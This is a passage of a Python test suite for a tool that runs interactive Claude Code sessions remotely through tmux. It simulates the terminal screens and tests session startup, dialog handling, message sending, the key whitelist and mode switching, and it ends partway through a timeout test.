"""ccr.session（v2：交互式 TUI）测试。

1. 桩测试：StubLink（模拟 AgentLink 的 request/事件/状态）+ SimTUI（按 fixtures 版式画屏、响应按键的假终端）。
2. fake 端到端：开发者 A 的 ccr.agent_link + ccr/fake_tui.py + 本机 tmux（存在时才运行）。
"""

import json
import logging
import os
import pathlib
import queue
import shutil
import tempfile
import threading
import time
import unittest
from unittest import mock

from ccr import node_agent, remote, session as S, tui_parse

logging.getLogger("ccr.session").setLevel(logging.ERROR)

RULE = "─" * 80
TOP = "▔" * 80
UUID1 = "59dd443a-c637-4148-bf1c-fd720f2e5b1f"
UUID2 = "285bd6a9-08c3-46e0-b111-3fe228694c59"
LEVELS = ["low", "medium", "high", "xhigh", "max"]


def wait_until(pred, timeout=5.0, interval=0.02):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if pred():
            return True
        time.sleep(interval)
    return pred()


# ============================================================================ 假终端
class SimTUI:
    """极简的"交互式 claude"：画面版式与 fixtures 一致（80 列），按键语义与实测一致。"""
    MODELS = [("Default (recommended)", "Opus 5.5 · Most capable"), ("Opus 5.5", "Opus 5.5 · Deep reasoning"),
              ("Fable 5.1", "Custom Fable model (claude-fable-5-1[1m])"),
              ("Sonnet", "Sonnet 5.5 · Efficient for routine tasks ·"),
              ("Haiku", "Haiku 5.5 · Fastest for quick answers ·"), ("Fable 5.2 (1M)", "claude-fable-5-2，1M 上下文")]
    MODES = ["⏵⏵ auto mode on (shift+tab to cycle)", "⏸ plan mode on (shift+tab to cycle)",
             "⏵⏵ accept edits on (shift+tab to cycle)"]
    WINDOW = 3
    SHOW_STATUS = True   # False = 没有状态栏（用户没配 statusline）

    def __init__(self, trust=False, session_id=UUID1):
        self.view = "trust" if trust else "idle"
        self.sel = 0
        self.content = ["", " ▐▛███▛█   Claude Code v2.1.330",
                        "▝▜██████▀  Haiku 5.5 with low effort · API Usage Billing", " ▝▝   ▝▝   /home/u", ""]
        self.input = ""
        self.busy = False
        self.mode = 0
        self.current = 4
        self.top = 0
        self.effort = "low"
        self.panel_effort = "low"
        self.dead = False
        self.exit_status = None
        self.ignore_keys = False
        self.saved = []           # Enter 保存为默认的记录
        self.wrapped = False      # 是否在列表顶/底按键导致回绕
        self.session_id = session_id
        self.transcript = []
        self.perm_cmd = "touch /tmp/x"   # 权限框预览（测试里改它 = 换成另一个对话框）
        self.popup = None                 # slash 补全列表 [(cmd, desc)…]，第 0 项高亮；None = 无
        self.on_paste = None              # 测试钩子：粘贴后立刻改画面（例如弹出权限框）
        self.ignore_confirm = False       # 面板对 s/Enter 没反应（测试 504）
        self.effort_hint = None           # 覆盖 /effort 面板提示行（测试"提示行不对就拒绝"）
        self.pane_pid = 100
        self.lock = threading.RLock()

    # -------------------------------------------------------------- 画屏
    def _footer(self):
        mode = self.MODES[self.mode] + (" · esc to interrupt" if self.busy else "")
        status = ["  u@node ▱▱▱ 0%% [%s · 1M · effort:%s]" % (self.MODELS[self.current][0], self.effort)]
        return [RULE, "❯ " + self.input.replace("\n", "\n  "), RULE] + (status if self.SHOW_STATUS else []) + \
            ["  " + mode]

    def _body(self, n=16):
        c = list(self.content)
        if self.busy:
            c += ["", "✶ Schlepping… (3s · thinking with low effort)", "  ⎿  Tip: Use /theme to change the color theme"]
        return (c[-n:] + [""] * n)[:n] if len(c) < n else c[-n:]

    def render(self):
        with self.lock:
            v = self.view
            if v == "trust":
                lines = ["", RULE, " Accessing workspace:", "", " /home/u", "",
                         " Quick safety check: Is this a project you created or one you trust?", "",
                         " Security guide", ""]
                for i, lab in enumerate(["No, exit", "Yes, I trust this folder"]):
                    lines.append((" ❯ " if self.sel == i else "   ") + lab)
                lines += ["", " Enter to confirm · Esc to cancel"]
                return "\n".join(lines)
            if v == "perm":
                lines = self._body(8) + [RULE, " Bash command", " Create probe file", "╌" * 80, " " + self.perm_cmd,
                                         "╌" * 80, " Do you want to proceed?"]
                labs = ["Yes", "Yes, and always allow access to /tmp from this project",
                        "Yes, and switch to auto mode · auto mode handles these prompts for you", "No"]
                for i, lab in enumerate(labs):
                    lines.append((" ❯ " if self.sel == i else "   ") + "%d. %s" % (i + 1, lab))
                lines += ["", " Esc to cancel · Tab to amend"]
                return "\n".join(lines)
            if v == "ask":
                lines = self._body(8) + [RULE, " ☐ 颜色偏好", "", "你更喜欢红色还是蓝色？", ""]
                opts = [("红色", "选择红色"), ("蓝色", "选择蓝色"), ("Type something.", None)]
                for i, (lab, desc) in enumerate(opts):
                    lines.append(("❯ " if self.sel == i else "  ") + "%d. %s" % (i + 1, lab))
                    if desc:
                        lines.append("     " + desc)
                lines += [RULE, ("❯ " if self.sel == 3 else "  ") + "4. Chat about this", "",
                          "Enter to select · ↑/↓ to navigate · Esc to cancel"]
                return "\n".join(lines)
            if v == "model":
                lines = self._body(4) + [TOP, "  Select model",
                                         "  Your pick is the default for new sessions. For other models, use --model."]
                n = len(self.MODELS)
                if self.top > 0:
                    lines.append("    ↑ %d more" % self.top)
                for i in range(self.top, min(n, self.top + self.WINDOW)):
                    name, desc = self.MODELS[i]
                    label = "%d. %s%s" % (i + 1, name, " ✔" if i == self.current else "")
                    pre = "  ❯ " if self.sel == i else "    "
                    lines.append(pre + label.ljust(26) + desc)
                    if i == 3:
                        lines.append(" " * 30 + "$2/$10 per Mtok")
                below = n - (self.top + self.WINDOW)
                if below > 0:
                    lines.append("    ↓ %d more" % below)
                sym = {"low": "○", "medium": "◐", "high": "●", "xhigh": "◉", "max": "◉"}[self.panel_effort]
                lab = self.panel_effort.capitalize() if self.panel_effort != "xhigh" else "Xhigh"
                lines += ["", "  %s %s effort%s ←/→ to adjust" % (sym, lab, " (default)" if self.panel_effort == "medium"
                                                                    else ""), "",
                          "  s to use this session only · Enter to save · Esc to cancel"]
                return "\n".join(lines)
            if v == "effort":
                names = "         low     medium     high     xhigh      max      Tab to toggle"
                col = names.index(self.panel_effort if self.panel_effort != "high" else " high ") + (
                    1 if self.panel_effort == "high" else 0) + len(self.panel_effort) // 2
                slider = list("         " + "─" * 42 + "      Ultracode  off")
                slider[col] = "▲"
                mx = self.panel_effort == "max"
                hint = self.effort_hint or ("←/→ to adjust · Enter to use this session only · Esc to cancel" if mx
                                            else "←/→ to adjust · s to use this session only · Enter to save · "
                                                 "Esc to cancel")
                lines = self._body(8) + [TOP, "  Effort", "", "         Faster                             Smarter",
                                         "".join(slider), names, "",
                                         "  May use excessive tokens resulting in long response times." if mx else "",
                                         "  " + hint]
                return "\n".join(lines)
            if v == "exited":
                return "\n".join(self._body(16))
            pop = []
            if self.popup and self.input.startswith("/"):
                pop = [("  ❯ " if i == 0 else "    ") + c.ljust(26) + d for i, (c, d) in enumerate(self.popup)]
            return "\n".join(self._body(16) + pop + self._footer())

    # -------------------------------------------------------------- 输入
    def _say(self, *lines):
        self.content += list(lines) + [""]

    def _submit(self, text):
        self.input = ""
        t = text.strip()
        if t == "/model":
            self.view = "model"
            self.sel = self.current
            self.top = max(0, min(self.current - 2, len(self.MODELS) - self.WINDOW))
            self.panel_effort = self.effort
            return
        if t == "/effort":
            self.view = "effort"
            self.panel_effort = self.effort
            return
        if t == "/exit":
            self.view = "exited"
            self.dead = True
            self.exit_status = 0
            return
        self._say("❯ " + t)
        if t == "/tool":
            self.view, self.sel = "perm", 0
            return
        if t == "/ask":
            self.view, self.sel = "ask", 0
            return
        if t == "/busy":
            self.busy = True
            return
        self._say("● 回复：" + t, "✻ Baked for 1s · done 7:50 PM")
        self.transcript.append({"type": "user", "uuid": "u%d" % len(self.transcript),
                                "message": {"role": "user", "content": t}})

    def paste(self, text, enter):
        with self.lock:
            if self.dead:
                raise RuntimeError("pane dead")
            if self.view == "ask" and self.sel == 2:
                self.typed = text
            elif self.view in ("idle",):
                self.input += text
            if self.on_paste is not None:
                self.on_paste(self)
            if enter and self.view == "idle":
                self._submit(self.input)

    def key(self, k):
        with self.lock:
            if self.ignore_keys or self.dead:
                return
            v = self.view
            if v == "trust":
                if k == "Down":
                    self.sel = min(1, self.sel + 1)
                elif k == "Up":
                    self.sel = max(0, self.sel - 1)
                elif k == "Enter":
                    if self.sel == 0:
                        self.view, self.dead, self.exit_status = "exited", True, 1
                    else:
                        self.view = "idle"
                elif k == "Escape":
                    self.view, self.dead, self.exit_status = "exited", True, 1
            elif v in ("perm", "ask"):
                n = 4
                if k == "Down":
                    if self.sel == n - 1:
                        self.wrapped = True
                    self.sel = (self.sel + 1) % n
                elif k == "Up":
                    if self.sel == 0:
                        self.wrapped = True
                    self.sel = (self.sel - 1) % n
                elif k == "Enter":
                    self.view = "idle"
                    if v == "perm":
                        self._say("  ⎿  chose %d" % (self.sel + 1))
                    else:
                        self._say("● 用户选择了 %d%s" % (self.sel + 1, (" " + getattr(self, "typed", ""))
                                                    if self.sel == 2 else ""))
                elif k == "Escape":
                    self.view = "idle"
                    self._say("  ⎿  Interrupted · What should Claude do instead?")
                elif k in "1234":
                    self.view = "idle"
                    self._say("  ⎿  chose %s" % k)
            elif v == "model":
                n = len(self.MODELS)
                if k == "Down":
                    if self.sel == n - 1:
                        self.wrapped = True
                    self.sel = (self.sel + 1) % n
                elif k == "Up":
                    if self.sel == 0:
                        self.wrapped = True
                    self.sel = (self.sel - 1) % n
                elif k in ("Left", "Right"):
                    lv = LEVELS if self.sel != 5 else ["low", "medium", "high", "max"]
                    i = lv.index(self.panel_effort) if self.panel_effort in lv else 0
                    i = max(0, min(len(lv) - 1, i + (1 if k == "Right" else -1)))
                    self.panel_effort = lv[i]
                elif k in ("s", "Enter"):
                    self.current = self.sel
                    self.effort = self.panel_effort
                    if k == "Enter":
                        self.saved.append(self.MODELS[self.sel][0])
                    self.view = "idle"
                    self._say("❯ /model", "  ⎿  Set model to %s" % self.MODELS[self.sel][0])
                elif k == "Escape":
                    self.view = "idle"
                    self._say("❯ /model", "  ⎿  Kept model as %s" % self.MODELS[self.current][0])
                if self.sel < self.top:
                    self.top = self.sel
                elif self.sel >= self.top + self.WINDOW:
                    self.top = self.sel - self.WINDOW + 1
            elif v == "effort":
                if k in ("Left", "Right"):
                    i = LEVELS.index(self.panel_effort) + (1 if k == "Right" else -1)
                    self.panel_effort = LEVELS[max(0, min(4, i))]
                elif k in ("s", "Enter") and self.ignore_confirm:
                    pass
                elif k == "s" and self.panel_effort == "max":
                    pass   # 实测：max 档没有 s
                elif k in ("s", "Enter"):
                    self.effort = self.panel_effort
                    if k == "Enter" and self.panel_effort != "max":   # max 档的 Enter = 仅本会话
                        self.saved.append("effort:" + self.effort)
                    self.view = "idle"
                    self._say("❯ /effort", "  ⎿  Set effort level to %s" % self.effort)
                elif k == "Escape":
                    self.view = "idle"
                    self._say("❯ /effort", "  ⎿  Cancelled")
            elif v == "idle":
                if k == "BTab":
                    self.mode = (self.mode + 1) % len(self.MODES)
                elif k == "Escape" and self.busy:
                    self.busy = False
                    self._say("  ⎿  Interrupted · What should Claude do instead?")
                elif k == "C-u":
                    parts = self.input.split("\n")
                    self.input = "\n".join(parts[:-1])
                elif k == "Enter":
                    self._submit(self.input)

    def status(self):
        if self.view in ("perm", "ask", "trust"):
            return "waiting"
        return "busy" if self.busy else "idle"


# ============================================================================ 桩 AgentLink
class StubRemote:
    """模拟一个作业上的 tmux server（跨 SessionManager 实例共享 → 测试 app 重启后重新附着）。"""

    def __init__(self):
        self.tuis = {}
        self.keeper = False
        self.log = []
        self.lock = threading.RLock()
        self.trust = False
        self.fail_start = None
        self.links = []
        self.before_guard = None   # 测试钩子：在 agent 复核 guard 之前改画面（模拟"恰在此时弹出对话框"）
        self.job_state = False     # StubLink.check_job() 的返回：True=作业已结束 / False=还在 / None=查不到

    def ops(self, name):
        return [p for (op, p) in self.log if op == name]

    def keys_sent(self, sid=None):
        """发给对话框/面板的按键（不含"提交消息"的 Enter：那一下带 input_nonempty 守卫，见 submits()）。"""
        out = []
        for op, p in self.log:
            if op == "keys" and (sid is None or p["sid"] == sid) and not (p.get("guard") or {}).get(
                    "input_nonempty"):
                out += p["keys"]
        return out

    def submits(self, sid=None):
        """提交输入框的 Enter（粘贴后单独发、带 input_box + input_nonempty 守卫）。"""
        return [p for op, p in self.log if op == "keys" and (sid is None or p["sid"] == sid)
                and (p.get("guard") or {}).get("input_nonempty")]


class StubLink:
    def __init__(self, rem: StubRemote, cfg, jobid, on_event, on_state, auto_ready=True):
        self.rem = rem
        self.cfg = cfg
        self.jobid = jobid
        self.on_event = on_event
        self.on_state = on_state
        self.state = "down"
        self.watched = set()
        self.closed = False
        self.auto_ready = auto_ready
        self._q = queue.Queue()
        self._last = {}
        rem.links.append(self)
        threading.Thread(target=self._pump, daemon=True).start()

    def _pump(self):
        while True:
            item = self._q.get()
            if item is None:
                return
            try:
                if item[0] == "ev":
                    self.on_event(item[1])
                else:
                    self.on_state(item[1], item[2])
            except Exception:  # noqa
                import traceback
                traceback.print_exc()

    def set_state(self, st, err=None):
        self.state = st
        self._q.put(("st", st, err))

    def start(self):
        self.set_state("connecting")
        if self.auto_ready:
            def go():
                time.sleep(0.02)
                if not self.closed:
                    self.set_state("ready")
            threading.Thread(target=go, daemon=True).start()

    def close(self):
        self.closed = True
        self.set_state("down")
        self._q.put(None)

    def ensure_keeper(self, timeout=120):
        if self.state != "ready":
            raise RuntimeError("down")
        self.rem.keeper = True

    def check_job(self):
        """模拟 AgentLink.check_job（squeue）：rem.job_state 为 True 时进入 ended。"""
        if self.rem.job_state:
            self.end_job()
        return self.rem.job_state

    def end_job(self, detail="作业 %s 已结束（squeue 查不到该作业）"):
        if self.state != "ended":
            self.state = "ended"
            self._q.put(("st", "ended", detail % self.jobid))

    def _emit_all(self):
        for sid in list(self.watched):
            t = self.rem.tuis.get(sid)
            if t is None:
                continue
            if t.dead:
                self._q.put(("ev", {"ev": "exited", "sid": sid, "exit_status": t.exit_status,
                                    "pane_pid": t.pane_pid}))
                self.watched.discard(sid)
                continue
            txt = t.render()
            if self._last.get(sid) != txt:
                self._last[sid] = txt
                self._q.put(("ev", {"ev": "screen", "sid": sid, "text": txt, "ts": time.time()}))
            st = t.status()
            if self._last.get((sid, "status")) != st:   # 与 node_agent 相同：session json 变化时发 session 事件
                self._last[(sid, "status")] = st
                self._q.put(("ev", {"ev": "session", "sid": sid,
                                    "data": {"pid": 200, "sessionId": t.session_id, "status": st,
                                             "cwd": "/home/u", "kind": "interactive", "entrypoint": "cli"}}))

    def request(self, op, timeout=30, **p):
        if self.state != "ready":
            e = type("AgentDown", (Exception,), {})("与计算节点 agent 的连接未就绪")
            raise e
        rem = self.rem
        with rem.lock:
            rem.log.append((op, dict(p)))
            if op == "hello":
                return {"server_alive": rem.keeper, "sessions": list(rem.tuis)}
            if op == "list":
                return [{"sid": sid, "name": "ccr-" + sid, "pane_pid": t.pane_pid, "pane_dead": t.dead,
                         "exit_status": t.exit_status, "claude_pid": None if t.dead else 200,
                         "session": None if t.dead else {"sessionId": t.session_id, "status": t.status(),
                                                         "cwd": "/home/u", "kind": "interactive",
                                                         "entrypoint": "cli"}}
                        for sid, t in rem.tuis.items()]
            if op == "start":
                if rem.fail_start:
                    raise type("AgentError", (Exception,), {})(rem.fail_start)
                if not rem.keeper:
                    raise type("AgentError", (Exception,), {})("tmux 常驻进程未启动")
                if p["sid"] in rem.tuis:
                    raise type("AgentError", (Exception,), {})("会话已存在")
                sid_c = UUID1
                if "--resume" in p["args"]:
                    sid_c = p["args"][p["args"].index("--resume") + 1]
                t = SimTUI(trust=rem.trust, session_id=sid_c)
                rem.next_pane = getattr(rem, "next_pane", 100) + 1   # 每次 start 新的 pane_pid（代际）
                t.pane_pid = rem.next_pane
                rem.tuis[p["sid"]] = t
                return {"pane_pid": t.pane_pid}
            t = rem.tuis.get(p.get("sid"))
            if op == "stop_keeper":
                if rem.tuis:
                    return {"stopped": False, "remaining": len(rem.tuis)}
                rem.keeper = False
                return {"stopped": True, "remaining": 0}
            if op == "kill":
                rem.tuis.pop(p["sid"], None)
                self.watched.discard(p["sid"])
                return {}
            if t is None:
                raise type("AgentError", (Exception,), {})("会话不存在")
            if op == "capture":
                return {"text": t.render()}
            if op == "watch":
                if p.get("on", True):
                    self.watched.add(p["sid"])
                    self._last.pop(p["sid"], None)
                    self._last[(p["sid"], "status")] = t.status()
                    self._q.put(("ev", {"ev": "session", "sid": p["sid"],
                                        "data": {"pid": 200, "sessionId": t.session_id, "status": t.status(),
                                                 "cwd": "/home/u", "kind": "interactive", "entrypoint": "cli"}}))
                    self._q.put(("ev", {"ev": "transcript", "sid": p["sid"], "session_id": t.session_id,
                                        "entries": list(t.transcript), "reset": True}))
                else:
                    self.watched.discard(p["sid"])
            elif op == "paste":
                assert isinstance(p["text"], str) and isinstance(p["enter"], bool)
                n0 = len(t.transcript)
                t.paste(p["text"], p["enter"])
                if len(t.transcript) > n0:
                    self._q.put(("ev", {"ev": "transcript", "sid": p["sid"], "session_id": t.session_id,
                                        "entries": t.transcript[n0:], "reset": False}))
            elif op == "keys":
                assert len(p["keys"]) <= 40
                g = p.get("guard")
                if g is not None:   # 与 node_agent 相同的发键前复核
                    try:
                        node_agent.validate_guard(g)
                    except node_agent.OpError as e:
                        raise type("AgentError", (Exception,), {})(str(e))
                    if rem.before_guard is not None:
                        rem.before_guard(t, p)
                    why = node_agent.check_guard(t.render(), g)
                    if why:
                        e = type("AgentError", (Exception,), {})("未发送按键：" + why)
                        e.code = "guard"
                        self._emit_all()
                        raise e
                n0 = len(t.transcript)
                for k in p["keys"]:
                    assert k in S.KEYS_WHITELIST, k
                    t.key(k)
                if len(t.transcript) > n0:
                    self._q.put(("ev", {"ev": "transcript", "sid": p["sid"], "session_id": t.session_id,
                                        "entries": t.transcript[n0:], "reset": False}))
            else:
                raise type("AgentError", (Exception,), {})("未知 op %s" % op)
            self._emit_all()
            return {}


# ============================================================================ 基类
class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="ccr-sess-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.cfg = {"host": "gpu-cluster", "jobid": "12345", "default_cwd": "~", "fake": False}
        self.rem = StubRemote()
        self.mgrs = []

    def mgr(self, auto_ready=True):
        def factory(cfg, jobid, on_event, on_state):
            return StubLink(self.rem, cfg, jobid, on_event, on_state, auto_ready=auto_ready)
        m = S.SessionManager(lambda: dict(self.cfg), pathlib.Path(self.tmp), link_factory=factory)
        m.step_timeout = 1.0
        m.panel_timeout = 2.0
        m.result_timeout = 2.0
        m.exit_timeout = 2.0
        m.poll_interval = 0.01
        m.link_timeout = 3.0
        m.connect_grace = 0.5
        m.screen_interval = 0.05
        self.mgrs.append(m)
        self.addCleanup(self._shut, m)
        return m

    @staticmethod
    def _shut(m):
        if not m._shutdown:
            m.shutdown()

    def start(self, m, **kw):
        kw.setdefault("jobid", "12345")
        kw.setdefault("cwd", "~")
        meta = m.create(**kw)
        sid = meta["sid"]
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] not in ("starting",), 5),
                        m.get_meta(sid))
        return sid

    def tui(self, sid):
        return self.rem.tuis[sid]

    def converse(self, m, sid):
        """让会话有一段真正的对话（agent 推送的 transcript 里出现 user + assistant）：
        之后 restart 才会 --resume（没有对话的会话重启时以新会话启动，见 session.restart）。"""
        meta = m.get_meta(sid)
        cid = meta.get("claude_session_id") or UUID1
        m._on_link_event(meta["jobid"], {"ev": "transcript", "sid": sid, "session_id": cid, "reset": False, "entries": [
            {"type": "user", "uuid": "u-conv", "message": {"role": "user", "content": "你好"}},
            {"type": "assistant", "uuid": "a-conv", "message": {"role": "assistant",
                                                                 "content": [{"type": "text", "text": "你好！"}]}}]})


# ============================================================================ 测试
class TestCreate(Base):
    def test_create_starts_and_watches(self):
        m = self.mgr()
        meta = m.create(jobid="12345", cwd="~/proj", model="claude-haiku-5-5", permission_mode="auto",
                        effort="low", title="t1")
        self.assertEqual(meta["state"], "starting")
        self.assertEqual(meta["launch"], {"model": "claude-haiku-5-5", "permission_mode": "auto",
                                          "skip_permissions": False, "effort": "low", "api_key_id": None})
        sid = meta["sid"]
        self.assertRegex(sid, r"^s[0-9a-f]{12}$")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        st = self.rem.ops("start")[0]
        self.assertEqual(st["sid"], sid)
        self.assertNotIn("api_key", st)   # 服务器默认：start 请求里没有 api_key，参数里没有 --settings
        self.assertEqual(st["cwd"], "~/proj")
        self.assertEqual(st["args"], ["--model", "claude-haiku-5-5", "--permission-mode", "auto",
                                      "--effort", "low"])
        self.assertTrue(self.rem.keeper)
        self.assertEqual(self.rem.ops("watch")[0], {"sid": sid, "on": True})
        meta = m.get_meta(sid)
        self.assertEqual(meta["link"], "ready")
        self.assertEqual(meta["claude_session_id"], UUID1)
        self.assertEqual(meta["claude_pid"], 200)
        self.assertEqual(meta["mode"], "auto")
        self.assertEqual(meta["cwd"], "/home/u")   # 由 sessions json 更新为绝对路径
        self.assertFalse(meta["busy"])
        self.assertEqual(meta["model"], "Haiku")   # 状态栏 [Haiku · 1M · effort:low] 优先于启动横幅
        # 没有用户操作就没有任何按键
        self.assertEqual(self.rem.ops("keys"), [])
        self.assertEqual(self.rem.ops("paste"), [])

    def test_default_no_args(self):
        m = self.mgr()
        sid = self.start(m)
        self.assertEqual(self.rem.ops("start")[0]["args"], [])
        self.assertEqual(m.get_meta(sid)["launch"], S._empty_launch())

    def test_skip_permissions_and_resume(self):
        m = self.mgr()
        self.start(m, skip_permissions=True, resume=UUID2)
        self.assertEqual(self.rem.ops("start")[0]["args"],
                         ["--resume", UUID2, "--dangerously-skip-permissions"])

    def test_validation(self):
        m = self.mgr()
        for kw in ({"jobid": "abc"}, {"jobid": ""}, {"permission_mode": "default"}, {"permission_mode": "yolo"},
                   {"effort": "huge"}, {"resume": "not-a-uuid"}, {"model": "bad model"},
                   {"skip_permissions": "yes"}, {"cwd": ""}):
            args = dict(jobid="12345", cwd="~")
            args.update(kw)
            with self.assertRaises(ValueError, msg=kw):
                m.create(**args)
        self.assertEqual(m.list_sessions(), [])

    def test_start_failure_sets_error(self):
        self.rem.fail_start = "目录不存在：/nope"
        m = self.mgr()
        meta = m.create(jobid="12345", cwd="/nope")
        sid = meta["sid"]
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "error"))
        self.assertIn("目录不存在", m.get_meta(sid)["error"])
        notices = [e["data"] for e in m.session_events(sid) if e["data"].get("type") == "notice"]
        self.assertTrue(any("目录不存在" in n["text"] for n in notices))

    def test_link_never_ready(self):
        m = self.mgr(auto_ready=False)
        m.link_timeout = 0.3
        sid = m.create(jobid="12345", cwd="~")["sid"]
        self.assertEqual(m.get_meta(sid)["link"], "connecting")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "error"))
        self.assertIn("连接计算节点超时", m.get_meta(sid)["error"])
        self.assertEqual(self.rem.ops("start"), [])

    def test_resume_already_running_rejected(self):
        m = self.mgr()
        self.start(m, resume=UUID2)
        with self.assertRaises(S.OpError) as cm:
            m.create(jobid="12345", cwd="~", resume=UUID2)
        self.assertEqual(cm.exception.api_code, "already_running")


class TestTrustAndRedLine(Base):
    def test_trust_dialog_waits_for_user(self):
        self.rem.trust = True
        m = self.mgr()
        sid = self.start(m)
        self.assertEqual(m.get_meta(sid)["state"], "trust")
        self.assertEqual(m.get_meta(sid)["dialog_kind"], "trust")
        time.sleep(0.3)
        self.assertEqual(self.rem.ops("keys"), [])          # 红线：绝不自动回答
        with self.assertRaises(S.OpError) as cm:
            m.send_message(sid, "hello")
        self.assertEqual(cm.exception.api_code, "dialog_open")
        r = m.choose(sid, 1)
        self.assertTrue(r["ok"])
        self.assertEqual(self.rem.keys_sent(sid), ["Down", "Enter"])
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))


    def test_trust_no_exit(self):
        self.rem.trust = True
        m = self.mgr()
        sid = self.start(m)
        r = m.choose(sid, 0)       # 用户选择 "No, exit"
        self.assertTrue(r["ok"])
        self.assertEqual(self.rem.keys_sent(sid), ["Enter"])
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "exited"))
        self.assertTrue(wait_until(lambda: not self.rem.keeper))


class TestMessages(Base):
    def test_send_message_paste_enter(self):
        m = self.mgr()
        sid = self.start(m)
        r = m.send_message(sid, "第一行\n第二行")
        self.assertTrue(r["ok"])
        # 粘贴不回车 → 确认文字进了输入框 → 单独发 Enter（带守卫）
        self.assertEqual(self.rem.ops("paste")[-1], {"sid": sid, "text": "第一行\n第二行", "enter": False})
        self.assertEqual(self.rem.submits(sid)[-1], {"sid": sid, "keys": ["Enter"], "guard": {
            "input_box": True, "input_nonempty": True, "popup": None}})
        self.assertTrue(wait_until(lambda: any(
            e["kind"] == "transcript" and not e["data"]["reset"] for e in m.session_events(sid))))
        tr = [e for e in m.session_events(sid) if e["kind"] == "transcript"]
        self.assertEqual(tr[-1]["data"]["type"], "transcript")
        self.assertEqual(tr[-1]["data"]["session_id"], UUID1)

    def test_send_message_validation(self):
        m = self.mgr()
        sid = self.start(m)
        for bad in ("", "   ", "a\x00b", "x" * (S.MAX_TEXT + 1), 5):
            with self.assertRaises(ValueError):
                m.send_message(sid, bad)
        with self.assertRaises(KeyError):
            m.send_message("s000000000000", "hi")

    def test_input_not_empty_requires_confirmation(self):
        m = self.mgr()
        sid = self.start(m)
        self.tui(sid).input = "残留文字\n第二行"
        with self.assertRaises(S.OpError) as cm:
            m.send_message(sid, "hi")
        self.assertEqual(cm.exception.api_code, "input_not_empty")
        self.assertIn("残留文字", str(cm.exception))
        self.assertEqual(self.rem.ops("keys"), [])
        m.send_message(sid, "hi", clear_input=True)
        self.assertEqual(self.rem.keys_sent(sid), ["C-u", "C-u"])
        self.assertEqual(self.rem.ops("paste")[-1]["text"], "hi")

    def test_send_keys_whitelist(self):
        m = self.mgr()
        sid = self.start(m)
        for bad in ([], ["Enter", "rm"], ["C-d"], ["a"], "Enter", [1], ["Enter"] * 41):
            with self.assertRaises(ValueError):
                m.send_keys(sid, bad)
        m.send_keys(sid, ["BTab", "Up", "1", "s", "C-c"])
        self.assertEqual(self.rem.keys_sent(sid), ["BTab", "Up", "1", "s", "C-c"])

    def test_interrupt_and_cycle_mode(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_message(sid, "/busy")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "busy"))
        self.assertTrue(m.get_meta(sid)["busy"])
        scr = m.get_screen(sid)
        self.assertTrue(scr["state"]["busy"])
        self.assertEqual(scr["state"]["spinner"], "Schlepping… (3s · thinking with low effort)")
        m.interrupt(sid)
        self.assertEqual(self.rem.keys_sent(sid), ["Escape"])
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        with self.assertRaises(S.OpError) as cm:
            m.interrupt(sid)          # 空闲时不发 Esc
        self.assertEqual(cm.exception.api_code, "not_busy")
        self.assertEqual(self.rem.keys_sent(sid), ["Escape"])
        r = m.cycle_mode(sid)
        self.assertEqual(r["mode"], "plan")
        self.assertEqual(self.rem.keys_sent(sid)[-1], "BTab")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["mode"] == "plan"))


class TestDialogs(Base):
    def test_permission_choose_navigates_stepwise(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_message(sid, "/tool")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "waiting"))
        self.assertEqual(m.get_meta(sid)["dialog_kind"], "permission")
        d = m.get_screen(sid)["state"]["dialog"]
        self.assertEqual(d["tool"], "Bash command")
        self.assertEqual(len(d["options"]), 4)
        with self.assertRaises(S.OpError):
            m.send_message(sid, "x")
        with self.assertRaises(ValueError):
            m.choose(sid, 4)
        with self.assertRaises(ValueError):
            m.choose(sid, -1)
        m.choose(sid, 3)
        self.assertEqual(self.rem.keys_sent(sid), ["Down", "Down", "Down", "Enter"])
        self.assertFalse(self.tui(sid).wrapped)
        self.assertIn("  ⎿  chose 4", self.tui(sid).content)

    def test_choose_moves_up_from_current(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_message(sid, "/tool")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "permission"))
        self.tui(sid).sel = 2   # 用户在终端面板里移动过光标
        m.choose(sid, 0)
        self.assertEqual(self.rem.keys_sent(sid), ["Up", "Up", "Enter"])
        self.assertIn("  ⎿  chose 1", self.tui(sid).content)

    def test_question_free_text(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_message(sid, "/ask")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "question"))
        with self.assertRaises(ValueError):
            m.choose(sid, 0, text="abc")     # 非 Type something 选项不接受文字
        m.choose(sid, 2, text="绿色")
        self.assertEqual(self.rem.keys_sent(sid), ["Down", "Down", "Enter"])
        self.assertEqual(self.rem.ops("paste")[-1], {"sid": sid, "text": "绿色", "enter": False})
        self.assertIn("● 用户选择了 3 绿色", self.tui(sid).content)

    def test_cancel_dialog(self):
        m = self.mgr()
        sid = self.start(m)
        with self.assertRaises(S.OpError) as cm:
            m.cancel_dialog(sid)
        self.assertEqual(cm.exception.api_code, "no_dialog")
        m.send_message(sid, "/ask")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "question"))
        r = m.cancel_dialog(sid)
        self.assertIsNone(r["state"]["dialog"])
        self.assertEqual(self.rem.keys_sent(sid), ["Escape"])

    def test_choose_unresponsive_times_out(self):
        m = self.mgr()
        m.step_timeout = 0.3
        sid = self.start(m)
        m.send_message(sid, "/tool")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "permission"))
        self.tui(sid).ignore_keys = True
        t0 = time.monotonic()
        with self.assertRaises(S.OpError) as cm:
